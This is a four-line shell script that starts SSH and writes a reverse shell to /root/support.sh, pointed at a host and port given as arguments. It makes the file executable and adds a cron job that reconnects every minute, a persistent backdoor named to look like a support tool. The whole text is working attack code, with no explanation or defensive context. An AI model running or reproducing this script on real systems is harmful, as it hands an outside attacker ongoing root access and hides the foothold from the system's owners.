service ssh start
echo "sudo bash -i >& /dev/tcp/$1/$2 0>&1" > /root/support.sh
chmod +x /root/support.sh
crontab -l | { cat; echo "* * * * * /bin/bash /root/support.sh"; } | crontab -
